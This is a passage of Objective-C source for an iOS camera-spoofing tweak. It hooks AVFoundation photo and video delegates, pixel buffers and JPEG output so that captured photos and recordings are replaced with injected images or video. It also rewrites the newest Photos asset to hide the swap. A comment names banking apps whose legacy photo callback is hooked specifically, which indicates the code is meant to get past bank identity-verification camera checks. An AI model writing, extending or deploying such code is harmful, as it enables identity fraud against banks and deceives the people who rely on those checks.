                        if (!data) data = vcam_currentFrameAsJPEG();
                        if (data) {
                            vcam_log([NSString stringWithFormat:@"fileDataRep direct JPEG: %lu bytes",
                                (unsigned long)data.length]);
                            return data;
                        }
                    }
                } @catch (NSException *e) {
                    vcam_log([NSString stringWithFormat:@"fileDataRep error: %@", e]);
                }
                return orig ? orig(_self, sel) : nil;
            });
            method_setImplementation(m, ni);
        }
    }
    // fileDataRepresentationWithCustomizer: — same internal replacement strategy
    {
        SEL sel = NSSelectorFromString(@"fileDataRepresentationWithCustomizer:");
        Method m = class_getInstanceMethod(cls, sel);
        if (m) {
            typedef NSData *(*F)(id, SEL, id);
            F orig = (F)method_getImplementation(m);
            IMP ni = imp_implementationWithBlock(^NSData *(id _self, id customizer) {
                @try {
                    if (vcam_isEnabled()) {
                        gLastCaptureTime = CACurrentMediaTime();
                        vcam_hookPHAsset();
                        NSData *data = vcam_currentFrameAsJPEG();
                        if (data) {
                            vcam_log([NSString stringWithFormat:@"fileDataRepWithCustomizer direct JPEG: %lu bytes",
                                (unsigned long)data.length]);
                            return data;
                        }
                    }
                } @catch (NSException *e) {}
                return orig ? orig(_self, sel, customizer) : nil;
            });
            method_setImplementation(m, ni);
        }
    }
    // CGImageRepresentation
    {
        SEL sel = @selector(CGImageRepresentation);
        Method m = class_getInstanceMethod(cls, sel);
        if (m) {
            typedef CGImageRef (*F)(id, SEL);
            F orig = (F)method_getImplementation(m);
            IMP ni = imp_implementationWithBlock(^CGImageRef(id _self) {
                @try {
                    if (vcam_isEnabled()) {
                        if (vcam_imageExists()) {
                            CIImage *ci = vcam_loadStaticImage();
                            if (ci && gCICtx) {
                                CGImageRef img = [gCICtx createCGImage:ci fromRect:ci.extent];
                                if (img) { vcam_log(@"Photo CGImage replaced"); return img; }
                            }
                        }
                        CGImageRef img = vcam_nextCGImage();
                        if (img) { vcam_log(@"Photo CGImage replaced (video)"); return img; }
                    }
                } @catch (NSException *e) {}
                return orig ? orig(_self, sel) : NULL;
            });
            method_setImplementation(m, ni);
        }
    }
    // pixelBuffer property — replace in place when accessed
    {
        SEL sel = @selector(pixelBuffer);
        Method m = class_getInstanceMethod(cls, sel);
        if (m) {
            typedef CVPixelBufferRef (*F)(id, SEL);
            F orig = (F)method_getImplementation(m);
            IMP ni = imp_implementationWithBlock(^CVPixelBufferRef(id _self) {
                CVPixelBufferRef pb = orig ? orig(_self, sel) : NULL;
                @try {
                    if (pb && vcam_isEnabled()) {
                        vcam_replacePixelBuffer(pb);
                    }
                } @catch (NSException *e) {}
                return pb;
            });
            method_setImplementation(m, ni);
        }
    }
    // previewPixelBuffer property
    {
        SEL sel = @selector(previewPixelBuffer);
        Method m = class_getInstanceMethod(cls, sel);
        if (m) {
            typedef CVPixelBufferRef (*F)(id, SEL);
            F orig = (F)method_getImplementation(m);
            IMP ni = imp_implementationWithBlock(^CVPixelBufferRef(id _self) {
                CVPixelBufferRef pb = orig ? orig(_self, sel) : NULL;
                @try {
                    if (pb && vcam_isEnabled()) {
                        vcam_replacePixelBuffer(pb);
                    }
                } @catch (NSException *e) {}
                return pb;
            });
            method_setImplementation(m, ni);
        }
    }
}

// --- Video Recording: parallel AVAssetWriter with timer-based frame capture ---
static void vcam_recCaptureFrame(void) {
    if (!gIsRecordingVideo || !gRecWriter || !gRecWriterInput || !gRecWriterAdaptor) return;
    @try {
        typedef BOOL (*ReadyF)(id, SEL);
        SEL rdySel = @selector(isReadyForMoreMediaData);
        ReadyF rdyFn = (ReadyF)[(NSObject *)gRecWriterInput methodForSelector:rdySel];
        if (rdyFn && !rdyFn(gRecWriterInput, rdySel)) return;

        // Generate virtual frame
        CIImage *virtImg = nil;
        // Stream mode
        if (vcam_streamFrameExists()) {
            NSData *sd = [NSData dataWithContentsOfFile:VCAM_STREAM_FRAME];
            if (sd.length > 0) {
                CGImageSourceRef ss = CGImageSourceCreateWithData((__bridge CFDataRef)sd, NULL);
                if (ss) {
                    CGImageRef cg = CGImageSourceCreateImageAtIndex(ss, 0, NULL);
                    CFRelease(ss);
                    if (cg) { virtImg = [CIImage imageWithCGImage:cg]; CGImageRelease(cg); }
                }
            }
        }
        // Image mode
        if (!virtImg && vcam_imageExists()) virtImg = vcam_loadStaticImage();
        // Video mode
        CMSampleBufferRef vf = nil;
        if (!virtImg) {
            vf = vcam_readFrame(gLockA, &gReaderA, &gOutputA);
            if (vf) {
                CVImageBufferRef pb = CMSampleBufferGetImageBuffer(vf);
                if (pb) virtImg = [CIImage imageWithCVImageBuffer:pb];
            }
            if (virtImg) virtImg = vcam_applyVideoTransforms(virtImg);
        }
        if (!virtImg) { if (vf) CFRelease(vf); return; }

        virtImg = vcam_aspectFill(virtImg, gRecWidth, gRecHeight);
        // Apply user-set pan offset (matches preview path)
        virtImg = vcam_applyOffset(virtImg, gRecWidth, gRecHeight, gVideoOffsetX, gVideoOffsetY);
        virtImg = vcam_applyColorInject(virtImg);

        // Render to pixel buffer (with IOSurface for CIContext compatibility)
        CVPixelBufferRef outPB = NULL;
        NSDictionary *pbAttrs = @{
            (id)kCVPixelBufferIOSurfacePropertiesKey: @{},
            (id)kCVPixelBufferWidthKey: @(gRecWidth),
            (id)kCVPixelBufferHeightKey: @(gRecHeight),
        };
        CVReturn cr = CVPixelBufferCreate(NULL, gRecWidth, gRecHeight,
            kCVPixelFormatType_32BGRA, (__bridge CFDictionaryRef)pbAttrs, &outPB);
        if (cr != kCVReturnSuccess || !outPB) { if (vf) CFRelease(vf); return; }

        if (!gCICtx) { CVPixelBufferRelease(outPB); if (vf) CFRelease(vf); return; }
        [gCICtx render:virtImg toCVPixelBuffer:outPB];

        // Calculate presentation time
        CMTime pts = CMTimeMake(gRecFrameCount, 30); // 30fps
        if (!gRecSessionStarted) {
            typedef void (*StartF)(id, SEL, CMTime);
            SEL stSel = @selector(startSessionAtSourceTime:);
            StartF stFn = (StartF)[(NSObject *)gRecWriter methodForSelector:stSel];
            if (stFn) stFn(gRecWriter, stSel, pts);
            gRecSessionStarted = YES;
        }

        typedef BOOL (*AppendF)(id, SEL, CVPixelBufferRef, CMTime);
        SEL appSel = @selector(appendPixelBuffer:withPresentationTime:);
        AppendF appFn = (AppendF)[(NSObject *)gRecWriterAdaptor methodForSelector:appSel];
        if (appFn) appFn(gRecWriterAdaptor, appSel, outPB, pts);
        gRecFrameCount++;

        CVPixelBufferRelease(outPB);
        if (vf) CFRelease(vf);
    } @catch (NSException *e) {}
}

static void vcam_startVirtualRecording(size_t width, size_t height) {
    @try {
        if (gIsRecordingVideo) return;
        if (!gRecQueue) gRecQueue = dispatch_queue_create("com.vcam.rec", DISPATCH_QUEUE_SERIAL);

        NSString *tmp = [NSTemporaryDirectory() stringByAppendingPathComponent:@"vcam_rec.mov"];
        [[NSFileManager defaultManager] removeItemAtPath:tmp error:nil];
        gVirtualRecordingURL = [NSURL fileURLWithPath:tmp];

        if (width == 0) width = 1920;
        if (height == 0) height = 1080;
        gRecWidth = width;
        gRecHeight = height;

        Class writerClass = objc_getClass("AVAssetWriter");
        if (!writerClass) { vcam_log(@"REC: AVAssetWriter not found"); return; }
        NSError *err = nil;
        gRecWriter = [[writerClass alloc] initWithURL:gVirtualRecordingURL
            fileType:AVFileTypeQuickTimeMovie error:&err];
        if (!gRecWriter || err) {
            vcam_log([NSString stringWithFormat:@"REC: writer create fail: %@", err]);
            return;
        }

        NSDictionary *settings = @{
            AVVideoCodecKey: AVVideoCodecTypeH264,
            AVVideoWidthKey: @(width),
            AVVideoHeightKey: @(height),
        };
        Class inputClass = objc_getClass("AVAssetWriterInput");
        gRecWriterInput = [[inputClass alloc] initWithMediaType:AVMediaTypeVideo outputSettings:settings];
        typedef void (*SetRTF)(id, SEL, BOOL);
        SEL rtSel = @selector(setExpectsMediaDataInRealTime:);
        SetRTF rtFn = (SetRTF)[(NSObject *)gRecWriterInput methodForSelector:rtSel];
        if (rtFn) rtFn(gRecWriterInput, rtSel, YES);

        Class adaptorClass = objc_getClass("AVAssetWriterInputPixelBufferAdaptor");
        gRecWriterAdaptor = [[adaptorClass alloc]
            initWithAssetWriterInput:gRecWriterInput sourcePixelBufferAttributes:nil];

        [gRecWriter performSelector:@selector(addInput:) withObject:gRecWriterInput];
        [gRecWriter performSelector:@selector(startWriting)];

        gRecSessionStarted = NO;
        gRecFrameCount = 0;
        gIsRecordingVideo = YES;

        // Start timer at 30fps to capture virtual frames
        gRecTimer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, gRecQueue);
        dispatch_source_set_timer(gRecTimer, DISPATCH_TIME_NOW, (uint64_t)(NSEC_PER_SEC / 30), NSEC_PER_MSEC);
        dispatch_source_set_event_handler(gRecTimer, ^{ vcam_recCaptureFrame(); });
        dispatch_resume(gRecTimer);

        vcam_log([NSString stringWithFormat:@"REC: started %zux%zu → %@", width, height, tmp]);
    } @catch (NSException *e) {
        vcam_log([NSString stringWithFormat:@"REC: start error: %@", e]);
    }
}

static void vcam_stopVirtualRecording(void) {
    if (!gIsRecordingVideo) return;
    gIsRecordingVideo = NO;
    // Stop timer
    if (gRecTimer) { dispatch_source_cancel(gRecTimer); gRecTimer = nil; }
    if (!gRecWriter) return;
    vcam_log([NSString stringWithFormat:@"REC: stopping writer... frames=%d", gRecFrameCount]);
    @try {
        [gRecWriterInput performSelector:@selector(markAsFinished)];
        typedef void (*FinishF)(id, SEL, void(^)(void));
        SEL finSel = @selector(finishWritingWithCompletionHandler:);
        FinishF finFn = (FinishF)[(NSObject *)gRecWriter methodForSelector:finSel];
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        finFn(gRecWriter, finSel, ^{
            vcam_log([NSString stringWithFormat:@"REC: writer finished, file at %@", gVirtualRecordingURL]);
            dispatch_semaphore_signal(sem);
        });
        dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5.0 * NSEC_PER_SEC)));
    } @catch (NSException *e) {
        vcam_log([NSString stringWithFormat:@"REC: stop error: %@", e]);
    }
    gRecWriter = nil;
    gRecWriterInput = nil;
    gRecWriterAdaptor = nil;

    // File replacement is now done in the recording delegate's didFinishRecording callback
    // (see vcam_hookRecordingDelegate) — this ensures the original file is fully written first
}

// Edit the latest video asset in Photos to replace with virtual recording
static void vcam_editLatestVideo(NSURL *virtualURL) {
    @try {
        if (!virtualURL || ![[NSFileManager defaultManager] fileExistsAtPath:[virtualURL path]]) {
            vcam_log(@"editLatestVideo: virtual file not found");
            return;
        }
        vcam_log(@"editLatestVideo: starting");

        void *h = dlopen("/System/Library/Frameworks/Photos.framework/Photos", RTLD_LAZY);
        if (!h) { vcam_log(@"editLatestVideo: Photos dlopen FAIL"); return; }

        Class PHAssetClass = objc_getClass("PHAsset");
        Class PHFetchOptionsClass = objc_getClass("PHFetchOptions");
        Class PHContentEditingOutputClass = objc_getClass("PHContentEditingOutput");
        Class PHAdjustmentDataClass = objc_getClass("PHAdjustmentData");
        Class PHAssetChangeRequestClass = objc_getClass("PHAssetChangeRequest");
        Class PHPhotoLibraryClass = objc_getClass("PHPhotoLibrary");

        if (!PHAssetClass || !PHFetchOptionsClass || !PHContentEditingOutputClass ||
            !PHAdjustmentDataClass || !PHAssetChangeRequestClass || !PHPhotoLibraryClass) {
            vcam_log(@"editLatestVideo: Photos classes not found");
            return;
        }

        PHFetchOptions *opts = [[PHFetchOptionsClass alloc] init];
        opts.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:NO]];
        opts.fetchLimit = 1;

        // Fetch latest video asset (mediaType 2 = PHAssetMediaTypeVideo)
        PHFetchResult *result = (PHFetchResult *)[PHAssetClass fetchAssetsWithMediaType:2 options:opts];
        PHAsset *asset = (PHAsset *)[result firstObject];
        if (!asset) {
            vcam_log(@"editLatestVideo: no recent video found");
            return;
        }
        vcam_log([NSString stringWithFormat:@"editLatestVideo: found asset %@", [asset valueForKey:@"localIdentifier"]]);

        [asset requestContentEditingInputWithOptions:nil completionHandler:^(id input, NSDictionary *info) {
            @try {
                if (!input) {
                    vcam_log([NSString stringWithFormat:@"editLatestVideo: editing input nil, info=%@", info]);
                    return;
                }

                PHContentEditingOutput *output = [[PHContentEditingOutputClass alloc] initWithContentEditingInput:input];
                NSURL *renderedURL = output.renderedContentURL;
                vcam_log([NSString stringWithFormat:@"editLatestVideo: renderedURL=%@", renderedURL]);
                if (!renderedURL) {
                    vcam_log(@"editLatestVideo: renderedURL is nil");
                    return;
                }

                // Copy virtual recording to rendered content URL
                NSFileManager *fm = [NSFileManager defaultManager];
                [fm removeItemAtURL:renderedURL error:nil];
                NSError *copyErr = nil;
                BOOL ok = [fm copyItemAtURL:virtualURL toURL:renderedURL error:&copyErr];
                vcam_log([NSString stringWithFormat:@"editLatestVideo: copy %@ err=%@",
                    ok ? @"OK" : @"FAIL", copyErr]);
                if (!ok) return;

                PHAdjustmentData *adj = [[PHAdjustmentDataClass alloc]
                    initWithFormatIdentifier:@"com.vcamplus.edit"
                    formatVersion:@"1.0"
                    data:[@"vcam-video" dataUsingEncoding:NSUTF8StringEncoding]];
                output.adjustmentData = adj;

                gIsVCamEditing = YES;
                id lib = [PHPhotoLibraryClass performSelector:@selector(sharedPhotoLibrary)];
                typedef void (*PerformF)(id, SEL, void(^)(void), void(^)(BOOL, NSError *));
                SEL perfSel = @selector(performChanges:completionHandler:);
                PerformF perfFn = (PerformF)[(NSObject *)lib methodForSelector:perfSel];
                perfFn(lib, perfSel, ^{
                    id changeReq = [PHAssetChangeRequestClass changeRequestForAsset:asset];
                    [changeReq performSelector:@selector(setContentEditingOutput:) withObject:output];
                }, ^(BOOL success, NSError *error) {
                    gIsVCamEditing = NO;
                    vcam_log([NSString stringWithFormat:@"editLatestVideo: %@ err=%@",
                        success ? @"SUCCESS" : @"FAIL", error]);
                });
            } @catch (NSException *e) {
                gIsVCamEditing = NO;
                vcam_log([NSString stringWithFormat:@"editLatestVideo inner error: %@", e]);
            }
        }];
    } @catch (NSException *e) {
        vcam_log([NSString stringWithFormat:@"editLatestVideo outer error: %@", e]);
    }
}

// Hook the recording delegate's didFinishRecordingToOutputFileAtURL:fromConnections:error:
// This is where the system confirms the .MOV file is fully written
static void vcam_hookRecordingDelegate(Class cls) {
    @try {
        if (!cls) return;
        NSString *cn = NSStringFromClass(cls);
        SEL sel = @selector(captureOutput:didFinishRecordingToOutputFileAtURL:fromConnections:error:);
        Method m = class_getInstanceMethod(cls, sel);
        if (!m) {
            vcam_log([NSString stringWithFormat:@"REC: delegate %@ has no didFinishRecording method", cn]);
            return;
        }
        IMP cur = method_getImplementation(m);
        @synchronized(gHookIMPs) {
            if ([gHookIMPs containsObject:@((uintptr_t)cur)]) return;
        }
        class_addMethod(cls, sel, cur, method_getTypeEncoding(m));
        m = class_getInstanceMethod(cls, sel);
        cur = method_getImplementation(m);
        IMP *store = (IMP *)calloc(1, sizeof(IMP));
        if (!store) return;
        *store = cur;
        SEL cs = sel;
        typedef void (*RecDelegateIMP)(id, SEL, id, NSURL *, NSArray *, NSError *);
        IMP hook = imp_implementationWithBlock(
            ^(id _s, id output, NSURL *fileURL, NSArray *connections, NSError *error) {
                @try {
                    vcam_log([NSString stringWithFormat:@"REC DELEGATE: didFinishRecording url=%@ err=%@",
                        [fileURL lastPathComponent], error]);
                    // Replace BEFORE calling original delegate — so Photos gets our virtual video
                    // for thumbnail generation and indexing
                    if (!error && gVirtualRecordingURL) {
                        @try {
                            NSFileManager *fm = [NSFileManager defaultManager];
                            NSError *repErr = nil;
                            if ([fm fileExistsAtPath:[gVirtualRecordingURL path]]) {
                                [fm removeItemAtURL:fileURL error:nil];
                                BOOL ok = [fm copyItemAtURL:gVirtualRecordingURL toURL:fileURL error:&repErr];
                                vcam_log([NSString stringWithFormat:@"REC: replaced BEFORE delegate %@ → %@ err=%@",
                                    ok ? @"OK" : @"FAIL", [fileURL lastPathComponent], repErr]);
                            } else {
                                vcam_log(@"REC: virtual file not found for pre-delegate replace");
                            }
                        } @catch (NSException *re) {
                            vcam_log([NSString stringWithFormat:@"REC: pre-delegate replace err: %@", re]);
                        }
                    }
                    // Now call original delegate — it processes our virtual .MOV
                    RecDelegateIMP fn = (RecDelegateIMP)(*store);
                    if (fn) fn(_s, cs, output, fileURL, connections, error);
                    // After delegate, edit latest video asset via PHAsset API to fix thumbnail
                    if (!error && gVirtualRecordingURL) {
                        NSURL *virtURL = [gVirtualRecordingURL copy];
                        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.3 * NSEC_PER_SEC)),
                            dispatch_get_global_queue(0, 0), ^{
                                vcam_editLatestVideo(virtURL);
                            });
                    }
                } @catch (NSException *e) {
                    vcam_log([NSString stringWithFormat:@"REC DELEGATE: exception %@", e]);
                }
            });
        method_setImplementation(m, hook);
        @synchronized(gHookIMPs) {
            [gHookIMPs addObject:@((uintptr_t)hook)];
        }
        vcam_log([NSString stringWithFormat:@"REC: hooked recording delegate %@", cn]);
    } @catch (NSException *e) {}
}

static void vcam_hookPhotoDelegate(Class cls) {
    @try {
        if (!cls) return;
        NSString *cn = NSStringFromClass(cls);
        SEL sel = @selector(captureOutput:didFinishProcessingPhoto:error:);
        Method m = class_getInstanceMethod(cls, sel);
        if (!m) return;
        IMP cur = method_getImplementation(m);
        @synchronized(gHookIMPs) {
            if ([gHookIMPs containsObject:@((uintptr_t)cur)]) return;
        }
        class_addMethod(cls, sel, cur, method_getTypeEncoding(m));
        m = class_getInstanceMethod(cls, sel);
        cur = method_getImplementation(m);
        IMP *store = (IMP *)calloc(1, sizeof(IMP));
        if (!store) return;
        *store = cur;
        SEL cs = sel;
        IMP hook = imp_implementationWithBlock(
            ^(id _s, id output, id photo, NSError *error) {
                @try {
                    vcam_log([NSString stringWithFormat:@"PHOTO DELEGATE CB: enabled=%@ error=%@ photo=%@",
                        vcam_isEnabled() ? @"Y" : @"N", error ? @"Y" : @"N", photo ? @"Y" : @"N"]);
                    if (vcam_isEnabled() && !error && photo) {
                        // Dynamically hook on the photo's actual runtime class
                        vcam_hookPhotoDataOnClass(object_getClass(photo));
                        vcam_hookPHAsset();
                        // Replace ALL internal pixel buffers
                        vcam_replacePhotoInternals(photo);
                    }
                    vcam_log(@">>> calling original photo delegate...");
                    OrigPhotoDelegateIMP fn = (OrigPhotoDelegateIMP)(*store);
                    if (fn) fn(_s, cs, output, photo, error);
                    vcam_log(@"<<< original photo delegate returned OK");
                } @catch (NSException *e) {
                    vcam_log([NSString stringWithFormat:@"!!! photo delegate exception: %@", e]);
                }
            });
        method_setImplementation(m, hook);
        @synchronized(gHookIMPs) {
            [gHookIMPs addObject:@((uintptr_t)hook)];
        }
        vcam_log([NSString stringWithFormat:@"Photo hook: %@", cn]);

        // iOS 10 legacy delegate: captureOutput:didFinishProcessingPhotoSampleBuffer:...
        // vcam123 hooks this; some banking apps (Hyakugo / OneSpan-wrapped Liquid SDK) call it
        // instead of the modern didFinishProcessingPhoto:error:. Replace photoSb's image buffer
        // in place so the JPEG conversion (separately hooked above) sees our pixels.
        SEL osel = @selector(captureOutput:didFinishProcessingPhotoSampleBuffer:previewPhotoSampleBuffer:resolvedSettings:bracketSettings:error:);
        Method om = class_getInstanceMethod(cls, osel);
        if (om) {
            IMP ocur = method_getImplementation(om);
            BOOL alreadyOurs = NO;
            @synchronized(gHookIMPs) { alreadyOurs = [gHookIMPs containsObject:@((uintptr_t)ocur)]; }
            if (!alreadyOurs) {
                class_addMethod(cls, osel, ocur, method_getTypeEncoding(om));
                om = class_getInstanceMethod(cls, osel);
                ocur = method_getImplementation(om);
                IMP *ostore = (IMP *)calloc(1, sizeof(IMP));
                if (ostore) {
                    *ostore = ocur;
                    SEL ocs = osel;
                    typedef void (*OldPhotoIMP)(id, SEL, id, CMSampleBufferRef, CMSampleBufferRef, id, id, NSError *);
                    IMP ohook = imp_implementationWithBlock(
                        ^(id _s, id output, CMSampleBufferRef photoSb, CMSampleBufferRef previewSb,
                          id resolved, id bracket, NSError *error) {
                            @try {
                                if (vcam_isEnabled() && !error && photoSb) {
                                    BOOL ok = vcam_replaceInPlace(photoSb);
                                    vcam_log([NSString stringWithFormat:@"OLD photo SB delegate: replace=%@", ok ? @"OK" : @"FAIL"]);
                                }
                                OldPhotoIMP fn = (OldPhotoIMP)(*ostore);
                                if (fn) fn(_s, ocs, output, photoSb, previewSb, resolved, bracket, error);
                            } @catch (NSException *e) {
                                vcam_log([NSString stringWithFormat:@"OLD photo SB delegate exception: %@", e]);
                            }
                        });
                    method_setImplementation(om, ohook);
                    @synchronized(gHookIMPs) { [gHookIMPs addObject:@((uintptr_t)ohook)]; }
                    vcam_log([NSString stringWithFormat:@"OLD photo SB delegate hooked on %@", cn]);
                }
            }
        }
    } @catch (NSException *e) {}
}

// --- Floating Window Icon (Base64 PNG 88x88) ---
static UIImage *_floatIconImage(void) {
    static UIImage *img = nil;
    if (img) return img;
    NSString *b64 = @"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